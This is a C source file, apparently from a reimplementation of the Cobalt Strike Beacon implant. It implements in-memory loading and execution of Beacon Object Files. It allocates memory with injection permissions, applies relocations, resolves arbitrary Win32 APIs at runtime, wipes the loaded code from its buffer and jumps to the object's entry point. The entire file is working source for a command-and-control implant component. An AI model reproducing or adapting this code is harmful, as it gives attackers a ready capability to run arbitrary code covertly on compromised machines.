#include "pch.h"

#include "inline_execute_object.h"

#include "api.h"
#include "beacon.h"
#include "settings.h"
#include "spawn.h"


// 1. Sections; 2. Relocations; 3. Symbols (hierarchy)

struct bapi;

typedef struct _RELOCATION
{
	unsigned short r_type; // relocation type - r_type
    union {
        short section;
        short function;
    } sof;
	long r_vaddr; //virtual address of the item to be relocated - r_vaddr
	unsigned long e_value; //value of the symbol - e_value
} RELOCATION;

// Relocate a 32-bit relative reference
#define RELOC_REL32 20

// Relocate a 32-bit absolute reference
#define RELOC_ADDR32 6

#define RELOC64_REL32 4

#define RELOC_UNK_10 10

BOOL ProcessRelocation(RELOCATION* relocation, char* code, char* img, char* pSection, unsigned long offsetInSection)
{
    // This is for the BOF to be able to call Win32 APIs
    if (IS_X64() && relocation->r_type < RELOC_UNK_10)
    {
	    const unsigned long long diff = *(unsigned long*)(code + relocation->r_vaddr) + (unsigned long long)(pSection + offsetInSection) - (unsigned long long)(img + relocation->r_vaddr + relocation->r_type);

        // Check if the difference is too big to fit in a 32-bit signed integer
        if (diff + (UINT_MAX / 2 + 1) > UINT_MAX)
		{
            LERROR("Relocation truncated to fit (distance between executable code and other data is >4GB)");
            BeaconErrorNA(ERROR_RELOCATION_TRUNCATED_TO_FIT);
            return FALSE;
		}

		*(long*)(code + relocation->r_vaddr) = *(long*)(code + relocation->r_vaddr) + (long)(pSection + offsetInSection) - (long)(img + relocation->r_vaddr + relocation->r_type);
    } else if (!IS_X64() && relocation->r_type == RELOC_ADDR32)
    {
        *(long*)(code + relocation->r_vaddr) = *(long*)(code + relocation->r_vaddr) + (long)(pSection + offsetInSection);
    }
    else if (!IS_X64() && relocation->r_type == RELOC_REL32)
    {
        *(long*)(code + relocation->r_vaddr) = *(long*)(code + relocation->r_vaddr) + (long)(pSection + offsetInSection) - (long)(img + relocation->r_vaddr + 4);
    }
    else
    {
        LERROR("Un-implemented relocation type %d", relocation->r_type);
        BeaconErrorD(ERROR_UNIMPLEMENTED_RELOCATION_TYPE, relocation->r_type);
        return FALSE;
    }

    return TRUE;
}

#define RDATA_SECTION_RELOC 1024
#define DATA_SECTION_RELOC 1025
#define EXE_SECTION_RELOC 1026
#define DYNAMIC_FUNC_RELOC 1027
#define MULTI_RELOC 1028

void InlineExecuteObject(char* buffer, int length)
{
	bapi *api = malloc(sizeof(bapi));
	BeaconAPI(api);

	datap parser;
	BeaconDataParse(&parser, buffer, length);
	int entryPoint = BeaconDataInt(&parser);

	sizedbuf codePair;
	char* code = BeaconDataLengthAndString(&parser, &codePair);
	int codeLength = codePair.size;

	sizedbuf rdataPair;
	char* rdata = BeaconDataLengthAndString(&parser, &rdataPair);

	sizedbuf dataPair;
	char* data = BeaconDataLengthAndString(&parser, &dataPair);

	sizedbuf relocationsPair;
	char* relocations = BeaconDataLengthAndString(&parser, &relocationsPair);

	sizedbuf bytesPair;
	char* bytes = BeaconDataLengthAndString(&parser, &bytesPair);

	char* img = VirtualAlloc(NULL, codeLength, MEM_COMMIT | MEM_RESERVE, S_PROCINJ_PERMS_I);
	if (!img)
	{
		free(api);
		return;
	}
    PROC* dynamicFunctionPtr;

	datap relocationsParser;
	BeaconDataParse(&relocationsParser, relocations, relocationsPair.size);
    

    //Clean version:
    for (RELOCATION* relocation = (RELOCATION*)BeaconDataPtr(&relocationsParser, sizeof(RELOCATION)); 
        relocation->sof.section != MULTI_RELOC; 
        relocation = (RELOCATION*)BeaconDataPtr(&relocationsParser, sizeof(RELOCATION)))
    {
        BOOL success;
        if (relocation->sof.section == RDATA_SECTION_RELOC)
        {
            success = ProcessRelocation(relocation, code, img, rdata, relocation->e_value);
        }
        else if (relocation->sof.section == DATA_SECTION_RELOC)
        {
            success = ProcessRelocation(relocation, code, img, data, relocation->e_value);
        }
        else if (relocation->sof.section == EXE_SECTION_RELOC)
        {
            success = ProcessRelocation(relocation, code, img, img, relocation->e_value);
        }
        else
        {
            if (relocation->sof.function != DYNAMIC_FUNC_RELOC)
            {
                // BOF Internal function
                dynamicFunctionPtr = (PROC*)api + relocation->sof.function;
            }
            else
            {
                // BOF Dynamic function
                char* lpModuleName = BeaconDataStringPointer(&relocationsParser);
                char* lpProcName = BeaconDataStringPointer(&relocationsParser);
                HMODULE hModule = GetModuleHandleA(lpModuleName);
                if (!hModule)
                {
                    hModule = LoadLibraryA(lpModuleName);
                }

                FARPROC lpProc = GetProcAddress(hModule, lpProcName);
                if (!lpProc)
                {
                    LERROR("Could not resolve API %s!%s", lpModuleName, lpProcName);
                    BeaconErrorPrintf(ERROR_RESOLVE_API_FAILED, "%s!%s", lpModuleName, lpProcName);
                    goto cleanup;
                }

                PROC* dynamicFunction = FindOrAddDynamicFunction(api, lpProc);
                if (!dynamicFunction)
                {
                    LERROR("No slot for function (reduce number of Win32 APIs called)");
                    BeaconErrorNA(ERROR_NO_SLOT_FOR_FUNCTION);
                    goto cleanup;
                }

                dynamicFunctionPtr = dynamicFunction;
            }

            success = ProcessRelocation(relocation, code, img, (char*)dynamicFunctionPtr, 0);
        }

        if (!success)
        {
            goto cleanup;
        }
    }

    memcpy(img, code, codeLength);
    memset(code, 0, codeLength);
    if (AdjustMemoryPermissions(img, codeLength))
    {
	    // Call the entry point whose signature is void go(char* buff, int len)
	    ((void(*)(char*, int))(img + entryPoint))(bytes, bytesPair.size);
    }

    cleanup:
    VirtualFree(img, 0, MEM_RELEASE);
    free(api);
}
